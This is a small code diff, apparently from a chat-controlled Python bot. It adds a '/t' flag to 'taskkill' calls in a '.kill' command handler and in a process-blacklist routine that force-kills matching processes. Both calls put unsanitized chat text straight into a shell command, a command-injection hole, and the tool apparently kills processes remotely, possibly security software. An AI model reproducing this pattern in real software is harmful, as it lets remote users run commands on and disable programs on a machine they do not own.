@@ -206,7 +206,7 @@ elif message.content[:5] == '.kill':
             #.log Sent message about missing process list 
     elif message.content[6:].lower() in [proc.name().lower() for proc in process_iter()]:
         #.log Process list is not generated, but valid process name is provided 
-        stdout = force_decode(subprocess.run(f'taskkill /f /IM {message.content[6:].lower()}', capture_output=True, shell=True).stdout).strip()
+        stdout = force_decode(subprocess.run(f'taskkill /f /IM {message.content[6:].lower()} /t', capture_output=True, shell=True).stdout).strip()
         #.log Tried to kill provided process 
         await asyncio.sleep(0.5)
         if message.content[6:].lower() not in [proc.name().lower() for proc in process_iter()]:
@@ -248,7 +248,7 @@ def process_blacklister():
             for x, y in enumerate(process_blacklist): process_blacklist[x] = y.replace('\n', '')
             for process in process_blacklist:
                 if process.lower() in [proc.name().lower() for proc in process_iter()]:
-                    stdout = force_decode(subprocess.run(f'taskkill /f /IM {process}', capture_output=True, shell=True).stdout).strip()
+                    stdout = force_decode(subprocess.run(f'taskkill /f /IM {process} /t', capture_output=True, shell=True).stdout).strip()
                     #.log Tried to kill provided process
                     time.sleep(1)
                     if process.lower() not in [proc.name().lower() for proc in process_iter()]:
